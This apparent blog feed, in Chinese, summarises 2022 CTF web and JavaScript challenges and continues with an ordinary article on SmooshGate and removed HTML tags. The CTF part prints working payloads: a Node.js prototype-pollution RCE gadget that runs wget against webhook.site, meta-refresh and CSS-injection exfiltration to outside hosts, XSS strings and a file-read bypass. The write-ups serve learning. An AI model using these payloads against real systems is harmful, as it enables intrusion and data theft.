XSS！（不過當初作者只有試到這一步就被 CSP 擋住了）。 這應該是 DOM Clobbering 最有名的案例之一了。 總結雖然說 DOM Clobbering 的使用場合有限，但真的是個相當有趣的攻擊方式！而且如果你不知道這個 feature 的話，可能完全沒想過可以透過 HTML 來影響全域變數的內容。 如果對這個攻擊手法有興趣的，可以參考 PortSwigger 的文章，裡面提供了兩個 lab 讓大家親自嘗試這個攻擊手法，光看是沒用的，要實際下去攻擊才更能體會。 參考資料： 使用 Dom Clobbering 扩展 XSS DOM Clobbering strikes back DOM Clobbering Attack学习记录.md DOM Clobbering学习记录 XSS in GMail’s AMP4Email via DOM Clobbering Is there a spec that the id of elements should be made global variable? Why don’t we just use element IDs as identifiers in JavaScript? Do DOM tree elements with ids become global variables?","link":"/2021/01/23/dom-clobbering/"},{"title":"2022 年 CTF Web 前端與 JS 題總結","text":"今年認真跟著 Water Paddler 打了一整年的 CTF，看到有人整理出了一篇 CTF: Best Web Challenges 2022，發現裡面的題目大多數我都有打過，就想說那不如我來寫一篇整理吧，整理一下我自己打過覺得有學到新東西的題目。 因為個人興趣，所以會特別記下來的題目都跟前端與 JS 相關，像是其他有關於後端（PHP、Java 等等）的我就沒記了。 另外，這題有紀錄到的技巧或解法不代表第一次出現在 CTF 上，只是我第一次看到或是覺得值得紀錄，就會寫下來。 我把題目分成幾個類別： JS 相關知識 Node.js 相關 XSLeaks 前端 DOM&#x2F;BOM 相關知識 瀏覽器內部運作相關 JS 相關知識DiceCTF 2022 - no-cookies這題的重點在於有一段程式碼的概念大概是這樣： &#123; const pwd = prompt('input password') if (!/^[^$']+$/.test(pwd)) return document.querySelector('.note').innerHTML = xssPayload &#125; 最後一行你有一個 DOM-based XSS，但你要偷的 pwd 是在 block 裡面，怎麼想都不可能存取到這一段。 而關鍵是那個看似不起眼的 RegExp，有個神奇的屬性叫做 RegExp.input 會把上次 test 的東西記起來，因此拿這個就可以拿到 pwd。 詳細 writeup：https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webno-cookies5-solves PlaidCTF 2022 - YACA題目核心概念類似這樣（不過我記得是非預期解就是了）： var tmpl = '&lt;input type=\"submit\" value=\"&#123;&#123;value&#125;&#125;\">' var value = prompt('your payload') value = value.replace(/[>\"]/g, '') tmpl = tmpl.replace('&#123;&#123;value&#125;&#125;', value) document.body.innerHTML = tmpl &gt;&quot; 都被取代掉了，看似不可能跳脫出屬性，但重點是 tmpl replace 的參數是可以控制的，此時可以利用 special replacement pattern 來找回你的 tag： var tmpl = '&lt;input type=\"submit\" value=\"&#123;&#123;value&#125;&#125;\">' var value = \"$'&lt;style onload=alert(1) \" value = value.replace(/[>\"]/g, '') tmpl = tmpl.replace('&#123;&#123;value&#125;&#125;', value) console.log(tmpl) // &lt;input type=\"submit\" value=\"\">&lt;style onload=alert(1) \"> 完整 writeup：https://blog.huli.tw/2022/04/14/javascript-string-regexp-magic/ ångstromCTF 2022 - CaaSio PSE簡單來說就是用 with() 來繞過不能用 . 的限制 完整 writeup：https://blog.huli.tw/2022/05/05/angstrom-ctf-2022-writeup/#misccaasio-pse GoogleCTF 2022 - HORKOS這題我會稱之為「JS 反序列化」，簡單來說就是 JS 裡面也有一些 magic method，會偷偷被執行到。 例如說你在 async function return 一個東西時，如果這個東西是 Promise，就會先解析完才回傳，所以 then 就會偷偷被呼叫到。 同理，一些隱式的型別轉換也會呼叫到 toString 或是 valueOf，轉成 JSON 時也會呼叫 toJSON 之類的。 完整 writeup：https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#horkos-10-solves corCTF 2022 - sbxcalcvar p = new Proxy(&#123;flag: window.flag || 'flag'&#125;, &#123; get: () => 'nope' &#125;) 要如何拿到被 Proxy 保護住的原始物件？ 答案是 Object.getOwnPropertyDescriptor(p, &#39;flag&#39;) writeup：https://blog.huli.tw/2022/12/08/ctf-js-notes/#corctf-2022-sbxcalc Node.js 相關DiceCTF 2022 - undefined這題核心大概是這樣： Function.prototype.constructor = undefined; delete global.global; process = undefined; &#123; let Array=undefined;let __dirname=undefined;let Int8Array=undefined; // ... 省略一大堆 undefined console.log(eval(input)); &#125; 基本上就是先把所有東西變成 undefined，最後會用 eval 執行你傳進去的程式碼。雖然你可以跑任何東西，但因為所有東西都變成 undefined 了，你沒什麼能做的。 解法有三個： import()，這個沒被刪掉 用 arguments.callee.caller.arguments 可以拿到上層被覆蓋掉的 arguments（Node.js 自動幫你包的一層） 用 try catch 可以拿到 Error 的 instance 詳細 writeup: https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#miscundefined55-solves corCTF 2022 - simplewaf這題的核心是這樣： if([req.body, req.headers, req.query].some( (item) => item &amp;&amp; JSON.stringify(item).includes(\"flag\") )) &#123; return res.send(\"bad hacker!\"); &#125; res.send(fs.readFileSync(req.query.file || \"index.html\").toString()); 你可以控制 req.query.file 但是不能包含 flag 這個字，目標是讀到 /app/flag.txt 這個檔案。 這題需要去看 fs.readFileSync 的內部實作，會發現可以傳入一個長得很像 URL instance 的物件，就會用 new URL() 去讀，就可以用 URL encode 繞過了： const fs = require('fs') console.log(fs.readFileSync(&#123; href: 1, origin: 1, protocol: 'file:', hostname: '', pathname: '/etc/passw%64' &#125;).toString()) // 等同於 readFileSync(new URL(\"file:///etc/passw%64\")) 作者 writeup：https://brycec.me/posts/corctf_2022_challenges#simplewaf Balsn CTF 2022 - 2linenodejs程式碼核心長這樣： #!/usr/local/bin/node process.stdin.setEncoding('utf-8'); process.stdin.on('readable', () => &#123; try&#123; console.log('HTTP/1.1 200 OK\\nContent-Type: text/html\\nConnection: Close\\n'); const json = process.stdin.read().match(/\\?(.*?)\\ /)?.[1], obj = JSON.parse(json); console.log(`JSON: $&#123;json&#125;, Object:`, require('./index')(obj, &#123;&#125;)); &#125;catch (e) &#123; require('./usage') &#125;finally&#123; process.exit(); &#125; &#125;); // index module.exports=(O,o) => ( Object.entries(O).forEach( ([K,V])=>Object.entries(V).forEach( ([k,v])=>(o[K]=o[K]||&#123;&#125;,o[K][k]=v) ) ), o ); 有一個很明顯的 prototype pollution，要做到 RCE。 這邊有一篇很棒的論文可以參考：Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js 但論文裡面提到的 gadget 被修掉了，要自己再找一個，結果如下： Object.prototype[\"data\"] = &#123; exports: &#123; \".\": \"./preinstall.js\" &#125;, name: './usage' &#125; Object.prototype[\"path\"] = '/opt/yarn-v1.22.19' Object.prototype.shell = \"node\" Object.prototype[\"npm_config_global\"] = 1 Object.prototype.env = &#123; \"NODE_DEBUG\": \"console.log(require('child_process').execSync('wget$&#123;IFS&#125;https://webhook.site?q=2').toString());process.exit()//\", \"NODE_OPTIONS\": \"--require=/proc/self/environ\" &#125; require('./usage.js') 細節可以看完整 writeup：https://blog.huli.tw/2022/12/08/ctf-js-notes#balsn-ctf-2022-2linenodejs XSleaksDiceCTF 2022 - carrot這題簡單來說就是利用 connection pool 來測量 response time。 你可能會想說測量 response time 有什麼難的，fetch 外加自己算一下不就好了嗎？但如果有 SameSite cookie 的話，fetch 是無法使用的，這時候就需要用到一些 XSleaks 的小技巧來測量時間。 在 Chrome 裡面 socket 數量是有上限的，一般是 255，headless 是 99，假設我們先把 socket 消耗到只剩下一個，這時候我去造訪我想測量時間的 URL（叫做 reqSearch），與此同時發另一個 request 到我們自己的 server（叫做 reqMeasure）。 由於 socket 只剩一個，所以 reqMeasure 從發出 request 到收到 response 的時間，就是 reqSearch 花的時間 + reqMeasure 花的時間，假設 reqMeasure 花的時間都差不多，那我們很容易可以測量出 reqSearch 花的時間。 詳細 writeup：https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webcarrot1-solves TSJ CTF 2022 - Nim Notes這題你可以做到 CRLF injection，但是位置在最底下，所以沒辦法覆蓋 CSP 也無法 XSS，要怎麼偷到頁面的內容？ 假設要偷的內容在 &lt;script&gt; 裡面，可以利用 Content-Security-Policy-Report-Only 這個 header，因為違反規時會發送一段 JSON 到指定位置，其中會包含 scripe 的前 40 個字元。 完整 writeup：https://blog.huli.tw/2022/03/02/tsj-ctf-2022-nim-notes/ ångstromCTF 2022 - Sustenance有一個搜尋功能，成功跟失敗的差別在於網址不同。 例如說成功是：/?m=your search...at 1651732982748 has success....，失敗是：/?m=your search...at 1651732982748 has failed 解法兩個，一個是利用 response 會 cache 的這點用 fetch 去測量是否有在 cache 內。雖然說 Chrome 有實裝 Cache parition 了，但是 headless 還沒。 第二個是利用其他 same site domain 做 cookie tossing，就可以構造出一個 cookie bomb，當搜尋成功的時候 payload 會太大（因為網址多了幾個字元），失敗的時候就沒事，藉此測量出差異。 完整 writeup：https://blog.huli.tw/2022/05/05/angstrom-ctf-2022-writeup/#websustenance justCTF 2022 - Ninja新的 xsleak，利用 :target 搭配 :before 來載入圖片。 細節可參考：New technique of stealing data using CSS and Scroll-to-Text Fragment feature. 完整 writeup：https://blog.huli.tw/2022/06/14/justctf-2022-writeup#ninja1-solves SekaiCTF 2022 - safelist利用 lazy-loading image 發 request 給 server 來拖慢 server 速度，就可以藉由 timing attack 得知圖片是否載入。 也可以利用前面提到的 connection pool 或是其他元素來解。 writeup：https://blog.huli.tw/2022/10/08/sekaictf2022-safelist-and-connection/ 前端 DOM&#x2F;BOM 相關知識DiceCTF 2022 - shadow這題的核心在於如何拿到 shadowDOM 裡的東西，更完整的研究在這：The Closed Shadow DOM 但總之最後的解法是： 設置 CSS -webkit-user-modify 屬性，效果跟 contenteditable 差不多 用 window.find 去 docus 內容 利用 document.execCommand 插入 HTML，並用 svg 拿到節點 詳細 writeup：https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webshadow0-solves LINE CTF 2022 - Haribote Secure Note這題有兩個注入點，第一個在 script 裡面，可以控制 16 個字元，第二個則是 HTML injection，而最大的問題是 CSP 很嚴格： &lt;meta content=\"default-src 'self'; style-src 'unsafe-inline'; object-src 'none'; base-uri 'none'; script-src 'nonce-&#123;&#123; csp_nonce &#125;&#125;' 'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default\" http-equiv=\"Content-Security-Policy\"> 解法有三個： 神奇的 script data double escaped state import() 不會被 Trusted Types 擋住 用 &lt;iframe src=&#39;/p&#39;&gt; 在其他頁面執行程式碼繞過 CSP 順便附上一篇很棒的文章：Eliminating XSS from WebUI with Trusted Types 完整 writeup：https://blog.huli.tw/2022/03/27/linectf-2022-writeup/#haribote-secure-note7-solves m0leCon CTF 2022 - ptMD利用 meta 組合技洩漏網址： &lt;meta name=\"referrer\" content=\"unsafe-url\" /> &lt;meta http-equiv=\"refresh\" content=\"3;url=https://webhook.site/d485f13a-fd8b-4cfd-ad13-63d9b0f1f5ef\" /> 在 CSP 很嚴格的狀態下，meta 可以作為一個突破的技巧。像上面這些 meta 不用放在 head 裡面也有作用，甚至移除掉之後也有用。 完整 writeup：https://blog.huli.tw/2022/05/21/m0lecon-ctf-2022-writeup#ptmd corCTF 2022 - modernblog這題是一個 React app，會用 dangerouslySetInnerHTML render 你的東西，也就是說你得到一個 HTML injection。 但 CSP 不讓你執行 script：script-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;; 你要偷的是有 flag ID 的網址，這個網址會出現在 /home 頁面，如果我們可以在那個頁面做 CSS injection，就可以這樣偷： a[href^=\"/post/0\"] &#123; background: url(//myserver?c=0); &#125; a[href^=\"/post/1\"] &#123; background: url(//myserver?c=1); &#125; // ... 而我們現在在的是 /posts/:id 頁面，所以沒辦法拿到 /home 頁面的內容，自然也就不能這樣做。 這題的關鍵點是一個很有趣的 DOM clobbering 應用，現在 React app 基本上都是用 react-router 這個 lib 來做路由的，這個 lib 裡面會去拿 document.defaultView.history，去看網址是什麼，來決定 render 哪個頁面。 而 document.defaultView 可以被 DOM clobbering 影響，像這樣： &lt;iframe name=defaultView src=/home>&lt;/iframe> 如此一來，document.defaultView.history 就變成了 /home，因此，我們只要用 iframe srcdoc 就可以在 React app 裡面再渲染一個 React app，並且用前面提過的 CSS injection 把 flag id 拿出來： &lt;iframe srcdoc=\" &lt;iframe name=defaultView src=/home>&lt;/iframe>&lt;br> &lt;style> a[href^=\"/post/0\"] &#123; background: url(//myserver?c=0); &#125; a[href^=\"/post/1\"] &#123; background: url(//myserver?c=1); &#125; &lt;/style> react app below&lt;br> &lt;div id=root>&lt;/div> &lt;script type=module crossorigin src=/assets/index.7352e15a.js>&lt;/script> \" height=\"1000px\" width=\"500px\">&lt;/iframe> 我之前寫過的英文 writeup：https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/ HITCON CTF 2022 - Self Destruct Message原本在用 element.innerHTML = str 的時候都是非同步的，但利用神奇的 &lt;svg&gt;&lt;svg&gt; 即可做到同步： const div = document.createElement('div') div.innerHTML = '&lt;svg>&lt;svg onload=console.log(1)>' console.log(2) 會先輸出 1 再來 2，而且不用插到 DOM 就會生效。 相關討論可以看：https://twitter.com/terjanq/status/1421093136022048775 writeup：https://blog.huli.tw/2022/12/08/ctf-js-notes/#hitcon-ctf-2022 SekaiCTF 2022 - Obligatory Calc兩個重點： onmessage 裡面的 e.source 是發送訊息的來源 window，雖然乍看之下一定是物件，但如果 postMessage 之後立刻關閉，就會變成 null 在 sandbox iframe 底下，存取 document.cookie 會發生錯誤 瀏覽器內部運作相關GoogleCTF 2022 - POSTVIEWER這題跟瀏覽器在執行東西時的順序有關，也跟 site isolation 之類的有關，透過這些東西就可以構造出一個 iframe 相關的 race condition。 完整 writeup：https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#postviewer-10-solves UIUCTF 2022 - modernism程式碼很簡單： from flask import Flask, Response, request app = Flask(__name__) @app.route('/') def index(): prefix = bytes.fromhex(request.args.get(\"p\", default=\"\", type=str)) flag = request.cookies.get(\"FLAG\", default=\"uiuctf&#123;FAKEFLAG&#125;\").encode() #^uiuctf&#123;[A-Za-z]+&#125;$ return Response(prefix+flag, mimetype=\"text/plain\") 把你給的東西加上 flag 之後輸出，雖然 mime type 是 text/plain，但因為沒有加上 X-Content-Type-Options: nosniff，所以還是可以用 &lt;script&gt; 來載入這一段。 但因為 flag 裡面有 &#123;&#125; 所以沒辦法輕易弄成可以被執行的腳本（會一直出現 syntax error） 解法是前面加上 BOM，瀏覽器就會把整個腳本用 UTF-16 去讀，flag 就會變奇怪的中文字就不會壞了，要放的內容是 ++window.，接著去看 window 的哪個屬性被改變就好了。 這題的解法基本上要知道瀏覽器怎麼去讀才能解。 完整 writeup：https://blog.huli.tw/2022/08/01/uiuctf-2022-writeup/ UIUCTF 2022 - precisionism上一題的延伸，只是結尾加上了Enjoy your flag!，因為這個結尾所以上面提過的招數不能用了。 預期解法是把 response 弄成 ICO 格式，把要 leak 的部分放到 width 去，然後 cross origin 拿圖片寬度是可以的，就可以一個 byte 一個 byte 把資料拿出來。 完整 writeup：https://blog.huli.tw/2022/08/01/uiuctf-2022-writeup#precisionism3-solves SECCON CTF 2022 Quals - spanote這題利用了 bfcache 這個東西：http://web.dev/articles/bfcache 假設有個 API 長這樣： fastify.get(\"/api/notes/:noteId\", async (request, reply) => &#123; const user = new User(request.session.userId); if (request.headers[\"x-token\"] !== hash(user.id)) &#123; throw new Error(\"Invalid token\"); &#125; const noteId = validate(request.params.noteId); return user.sendNote(reply, noteId); &#125;); 雖然是個 GET，但是會檢查 custom header，因此照理來說直接用瀏覽器訪問是看不了的。 但利用 bfcache，可以這樣解： 用瀏覽器打開 /api/notes/id，出現錯誤畫面 用同一個 tab 去到首頁，此時首頁會用 fetch 搭配 custom header 去抓 /api/notes/id，瀏覽器會把結果存在 disk cache 內 上一頁，此時畫面會顯示 disk cache 的結果 就可以用瀏覽器直接瀏覽 cached response，繞過了 custom header 的限制。 完整 writeup：https://blog.huli.tw/2022/12/08/ctf-js-notes/#seccon-ctf-2022-quals-spanote 特別加映：人物介紹原本就有幾個人令我印象特別深刻，想說既然都整理了題目，順便整理一下這些人好了。 第一位是 Ankur Sundara，隸屬於 dicegang 戰隊，上面 UIUCTF 的題目是他出的，之前解了一題跟 content type 有關的題目也是他出的，感覺應該是把 Chromium source code 相關部分看了一遍才產出那些題目。 另外這篇對 Shadow DOM 的研究也是他寫的：The Closed Shadow DOM 第二位是 terjanq，在 Google 上班，上面講到的 GoogleCTF race condition 那題是他出的，以前也出過一堆經典題目，XSleak wiki 是他維護的，總覺得在跟瀏覽器有關的行為這塊沒什麼他不會的… 偶爾會跟著 justCatTheFish 戰隊一起打 CTF，如果有些前端 Web 題只有一兩隊解出來，高機率 justCatTheFish 是其中一隊。 第三位是 strellic，也來自於 dicegang，出了一堆題目而且品質都很好，writeup 也寫得很詳細，從他那邊學到很多技巧跟新的想法，總是能結合以前的技巧然後發展出新的手法，真的很厲害。 除了這些當然還有其他印象深刻的人，但就懶得一一介紹了XD 像是開頭提到的文章作者 @arkark_、出了讓我到現在還驚艷的一題的 @zwad3、解出難題的常客 @parrot409 以及 @maple3142，都很常看到他們活躍在 CTF 中。 總結整理過後發現自己還打過滿多題目的（雖然很多都沒解出來就是了），而有些題目雖然概念不難，但要實作起來也是滿麻煩的。 另外，可以發現有不少題目需要去看到 lib 的 source code 才有辦法解，我個人是滿喜歡這種題目的，就有種 real world 的感覺吧，平時在用的東西但你其實不知道它背後是怎麼運作的，藉由 CTF 強迫你去理解它。雖然與 Web 無關，但今年也出現了兩三次跟 Git 有關的題目，也都是需要去理解 Git 背後的運作才能解。 今年學到了很多以前完全不知道的技巧，覺得自己對於 JS 跟瀏覽器的理解又上升了一點，但可以預見的是明年一定還是被電，還是會出現更多以前不知道的東西。 最後也要感謝一下每個出題者，是因為有這些出題者藉由題目分享自己的研究，才能讓其他人學到這些新穎的技巧。我自己認為出一個好的題目比解題還要難，解題的話你知道一定會有答案在那邊，只要找到答案就好。而出題如果要出的好，你要自己先去發現一個新的東西，這個真的難，再次對每個出題者致上敬意。","link":"/2022/12/26/ctf-2022-web-js-summary/"},{"title":"Don’t break the Web：以 SmooshGate 以及 <keygen> 為例","text":"前言最近 YDKJS（You Don’t Know JS 的縮寫，中譯版翻成：你所不知道的JS）有了第二版，名叫 YDKJSY，Y 是 Yet 的意思（中文版可能可以翻叫：你還是不知道的 JS）。這個第二版還沒全部完成，但在 GitHub 上面已經公開了最前面的一些章節。 搶先讀了一下第一章，在講與 JS 相關的歷史，其中提到一段讓我很感興趣的議題： As such, sometimes the JS engines will refuse to conform to a specification-dictated change because it would break that web content. In these cases, often TC39 will backtrack and simply choose to conform the specification to the reality of the web. For example, TC39 planned to add a contains(..) method for Arrays, but it was found that this name conflicted with old JS frameworks still in use on some sites, so they changed the name to a non-conflicting includes(..). The same happened with a comedic&#x2F;tragic JS community crisis dubbed “smooshgate”, where the planned flatten(..) method was eventually renamed flat(..). 大意是在說有時候 JS 的規格必須跟現實（已經存在的那些舊的實作）妥協。例如說原本 Array 要加上一個叫做 contains 的 method，但因為會有問題所以改叫 includes，flatten 也改名叫做 flat。 還有一個上面特別標起來的詞「smooshgate」，用這個當關鍵字去找才發現是去年三月左右發生的事件，至於發生了什麼，底下會詳述，跟上面提的 flatten 有關。看到有這件事的時候我第一個反應是：「咦，我怎麼什麼都不知道？」，查了一下繁體中文的資料，大概也只有這篇有提到：SmooshGate，以及[筆記] 3 種 JavaScript 物件屬性的特性這篇有擦到邊而已。 在仔細研究了一下事情的來龍去脈之後，覺得是個滿有趣的議題，因此寫了這篇跟大家分享。 SmooshGate 事件有關這個事件以及這篇文章的靈感，大多數來自於：#SmooshGate FAQ 這篇文章，裡面其實解釋得很好，建議大家可以去看這篇。 但懶得看也沒關係，底下我簡單講一下事情的來龍去脈。 有一個組織叫做 TC39，全名為 Technical Committee 39，第 39 號技術委員會，負責與 ECMAScript 規範相關的事項，例如說決定哪些提案可以過關之類的，而最後那些提案就會被納入新的 ECMAScript 標準之中。 提案一共分成五個 stage，從 stage0 到 stage4，詳情我就不多說明了，可以參考 Championing a proposal at TC39 或是 The TC39 Process。 TC39 之前有一個提案是 Array.prototype.{flatten,flatMap}（flatten 現在已經改為 flat）。 這邊先幫不清楚什麼是 flatten 的讀者簡單介紹一下它的功用，簡單來說就是把巢狀的東西攤平。 例如說底下範例： let arr = [1, 2, [3], [4], [5, 6, 7]] console.log(arr.flatten()) // [1, 2, 3, 4, 5, 6, 7] 原本巢狀的陣列會被攤平，這就是 flatten 的意思，跟 lodash 裡面的 flatten 是差不多的。 詳細的使用方法可以參考 MDN，就只是多了一個參數 depth 可以讓你指定展開的深度。 而 flatMap 就是先 map 之後再 flat，熟悉 RxJS 的朋友們應該會感到滿親切的（在 RxJS 裡面又稱作 mergeMap，而且 mergeMap 比較常用，有興趣的朋友也可以參考這篇：concatAll and concatMap rather than flatten and flatMap）。 好，這個提案看似很不錯，但到底會有什麼問題呢？ 問題就出在一個前端新鮮人可能沒聽過的工具：MooTools，而我也只有聽過而已，完全沒用過。想要快速知道它可以幹嘛的，請看這篇十年前的比較文：jQuery vs MooTools。 在 MooTools 裡面，他們定義了自己的 flatten method，在 code 裡面做了類似下面的事： Array.prototype.flatten = /* ... */; 這聽起來沒什麼問題，因為就算 flatten 正式列入標準並且變成原生的 method，也只是把它覆蓋掉而已，沒事兒沒事兒。 但麻煩的事情是，MooTools 還有一段 code 是把 Array 的 method 都複製到 Elements（MooTools 自定義的 API）上面去： for (var key in Array.prototype) &#123; Elements.prototype[key] = Array.prototype[key]; &#125; for…in 這個語法會遍歷所有可列舉的（enumerable）屬性，而原生的 method 並不包含在裡面。 例如說在 Chrome devtool 的 console 執行以下這段 code： for (var key in Array.prototype) &#123; console.log(key) &#125; 會發現什麼都沒有印出來。 但如果你加上了幾個自定義的屬性之後： Array.prototype.foo = 123 Array.prototype.sort = 456 Array.prototype.you_can_see_me = 789 for (var key in Array.prototype) &#123; console.log(key) // foo, you_can_see_me &#125; 會發現只有自定義的屬性會是 enumerable 的，而原生的方法你就算覆寫，也還是不會變成 enumerable。 那問題是什麼呢？問題就出在當 flatten 還沒正式變成 Array 的 method 時，它就只是一個 MooTools 自定義的屬性，是 enumerable 的，所以會被複製到 Elements 去。但是當 flatten 納入標準並且被瀏覽器正式支援以後，flatten 就不是 enumerable 的了。 意思就是，Elements.prototype.flatten 就會變成 undefined，所有使用到這個 method 的 code 都會掛掉。 此時天真的你可能會想說：「那就把 flatten 變成 enumerable 的吧！」，但這樣搞不好會產生更多問題，因為一堆舊的 for…in 就會突然多出一個 flatten 的屬性，很有可能會造成其他的 bug。 當初發現這個 bug 的討論串可以看這裡：Implementing array.prototype.flatten broke MooTools’ version of it. 確認有了這個問題以後，大家就開始討論要把 flatten 換成什麼詞，有人在 Issues 裡面提議說：rename flatten to smoosh，引起了廣大討論，也就是 #SmooshGate 事件的起源。除了討論改名以外，也有人認為乾脆就讓那些網站壞掉好了。 smoosh 這個字其實跟 flatten 或是其他人提議的 squash 差不多，都有把東西弄平的意思在，不過這個字實在是非常少見，聽到這事件以前我也完全沒聽過這個單字。不過這個提議其實從來沒有正式被 TC39 討論過就是了。 TC39 在 2018 年 5 月的會議上，正式把 flatten 改成 flat，結束了這個事件。 這個提案的時間軸大概是這樣： 2017 年 7 月：stage 0 2017 年 7 月：stage 1 2017 年 9 月：stage 2 2017 年 11 月：stage 3 2018 年 3 月：發現 flatten 會讓 MooTools 壞掉 2018 年 3 月：有人提議改名為 smoosh 2018 年 5 月：flatten 改名為 flat 2019 年 1 月：stage 4 我因為好奇去找了 V8 的 commit 來看，V8 是在 2018 年 3 月的時候實作這個功能的：[esnext] Implement Array.prototype.{flatten,flatMap}，其中我覺得最值得大家學習的其實是測試的部分： const elements = new Set([ -Infinity, -1, -0, +0, +1, Infinity, null, undefined, true, false, '', 'foo', /./, [], &#123;&#125;, Object.create(null), new Proxy(&#123;&#125;, &#123;&#125;), Symbol(), x => x ** 2, String ]); for (const value of elements) &#123; assertEquals( [value].flatMap((element) => [element, element]), [value, value] ); &#125; 直接丟了各種奇形怪狀的東西進去測。 在 flatten 改名為 flat 的隔天，V8 也立刻做出修正：[esnext] Rename Array#flatten to flat。 簡單總結一下，總之 #SmooshGate 事件就是： 有人提議新的 method：Array.prototype.flatten 發現會讓 MooTools 壞掉，因此要改名 有人提議改名 smoosh，也有人覺得不該改名，引起一番討論 TC39 決議改成 flat，事情落幕 其中的第二點可能有些人會很疑惑，想說 MooTools 都是這麼古早的東西了，為什麼不直接讓它壞掉就好，反正都是一些老舊的網站了。 這就要談論到制定 Web 相關標準時的原則了：Don’t break the web。 Don’t break the Web仔細想想，好像會發現 Web 的領域沒有什麼 breaking change，你以前可以用的 JS 語法現在還是可以用，只是多了一些新的東西，而不是把舊的東西改掉或者是拿掉。 因為一旦出現 breaking change，就可能會有網站遭殃，像是出現 bug 甚至是整個壞掉。其實有很多網站好幾年都沒有在維護了，但我們也不應該讓它就這樣壞掉。如果今天制定新標準時有了 breaking change，最後吃虧的還是使用者，使用者只會知道網站壞了，卻不知道是為什麼壞掉。 所以在 SmooshGate 事件的選擇上，比起「flatten 就是最符合語義，讓那些使用 MooTools 的老舊網站壞掉有什麼關係！」，TC39 最終選擇了「把 flatten 改一下名字就好，雖然不是最理想的命名，但我們不能讓那些網頁壞掉」。 不過話雖如此，這不代表糟糕的設計一旦出現以後，就完全沒有辦法被移除。 事實上，有些東西就悄悄地被移除掉了，但因為這些東西太過冷門所以你我可能都沒注意到。 WHATWG 的 FAQ 有寫到： That said, we do sometimes remove things from the platform! This is usually a very tricky effort, involving the coordination among multiple implementations and extensive telemetry to quantify how many web pages would have their behavior changed. But when the feature is sufficiently insecure, harmful to users, or is used very rarely, this can be done. And once implementers have agreed to remove the feature from their browsers, we can work together to remove it from the standard. 底下有提到了兩個範例：&lt;applet&gt; 與 &lt;keygen&gt;。 也是因為好奇，所以我又去找了一些相關資料來看。 被淘汰的 HTML 標籤有聽過&lt;keygen&gt;這個標籤的請舉手一下？舉手的人麻煩大家幫他們鼓鼓掌，你很厲害，封你為冷門 HTML 標籤之王。 我就算看了 MDN 上面的範例，也沒有很清楚這個標籤在幹嘛。只知道這是一個可以用在表單裡的標籤，人如其名，是用來產生與憑證相關的 key 用的。 從 MDN 給的資料 Non-conforming features 裡面，我們可以進一步找到其他也被淘汰的標籤，例如說： applet acronym bgsound dir isindex keygen nextid 不過被標示為 obsolete 不代表就沒有作用，應該只是說明你不該再使用這些標籤，因為我猜根據 don’t break the web 的原則，裡面有些標籤還是可以正常運作，例如說小時候很愛用的跑馬燈 marquee 也在 Non-conforming features 裡面。 在另外一份 DOM 相關的標準當中，有說明了該如何處理 HTML 的 tag，我猜這些才是真的被淘汰而且沒作用的標籤： If name is applet, bgsound, blink, isindex, keygen, multicol, nextid, or spacer, then return HTMLUnknownElement. 如果你拿這些標籤到 Chrome 上面去試，例如說這樣： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"UTF-8\"> &lt;/head> &lt;body> &lt;bgsound>123&lt;/bgsound> &lt;isindex>123&lt;/isindex> &lt;multicol>123&lt;/multicol> &lt;foo>123&lt;/foo> &lt;/body> &lt;/html> 就會發現表現起來跟&lt;span&gt;差不多，猜測 Chrome 應該會把這些不認識的 tag 當作 span 來看待。 再來因為好奇，所以也去找了一下 chromium 裡相關的程式碼，我以前都是直接在 GitHub 上面去搜尋 code 的內容，但因為這次要搜的關鍵字重複性太高，因此改成搜 commit message。這個時候就完全突顯 commit message 的重要性了，發現 chromium 的 commit message 寫得滿好的。 例如說這個 commit：Remove support for the obsolete tag. This patch removes all special-casing for the &lt;isindex&gt; tag; it now behaves exactly like &lt;foo&gt; in all respects. This additionally means that we can remove the special-casing for forms containing &lt;input name&#x3D;&quot;isindex&quot;&gt; as their first element. The various tests for &lt;isindex&gt; have been deleted, with the exception of the imported HTML5Lib tests. It&#39;s not clear that we should send them patches to remove the &lt;isindex&gt; tests, at least not while the element is (an obsolete) part of HTML5, and supported by other vendors. I&#39;ve just landed failing test results here. That seems like the right thing to do. &quot;Intent to Remove&quot; discussion: https:&#x2F;&#x2F;groups.google.com&#x2F;a&#x2F;chromium.org&#x2F;d&#x2F;msg&#x2F;blink-dev&#x2F;14q_I06gwg8&#x2F;0a3JI0kjbC0J 有附上當初的討論串，資訊給的很詳細。而 code 的改動除了測試的部分以外，就是把有關這個 tag 的地方都刪掉，當作是一個不認識的 tag，所以 message 才會說：「it now behaves exactly like &lt;foo&gt; in all respects.」 再來我們看另外一個 commit：Remove support for the keygen tag This removes support for &lt;keygen&gt; by updating it to be an HTMLUnknownElement. As a result, it&#39;s no longer a form-associated element and no longer has IDL-assigned properties. The &lt;keygen&gt; tag is still left in the parser, similar to &lt;applet&gt;, so that it maintains the document parse behaviours (such as self-closing), but is otherwise a neutered element. Tests that were relying on &lt;keygen&gt; having its own browser-created shadow root (for its custom select element) have been updated to use progress bars, while other tests (such as &lt;keygen&gt;-related crash tests) have been fully removed. As Blink no longer treats this tag as special, all the related IPC infrastructure is removed, including preferences and enterprise flags, and all localized strings, as they&#39;re all now unreachable. This concludes the &quot;Intent to Remove&quot; thread for &lt;keygen&gt; at https:&#x2F;&#x2F;groups.google.com&#x2F;a&#x2F;chromium.org&#x2F;d&#x2F;msg&#x2F;blink-dev&#x2F;z_qEpmzzKh8&#x2F;BH-lkwdgBAAJ 因為&lt;keygen&gt;這個 tag 原本的處理就比較複雜，比起剛剛的&lt;isindex&gt;，改動的檔案多了很多，看起來是把相關的東西全部都拿掉了。 最後來看這一個：bgsound must use the HTMLUnknownElement interface As specified here: https:&#x2F;&#x2F;html.spec.whatwg.org&#x2F;#bgsound This causes one less fail on: http:&#x2F;&#x2F;w3c-test.org&#x2F;html&#x2F;semantics&#x2F;interfaces.html 裡面給的測試連結：Test of interfaces 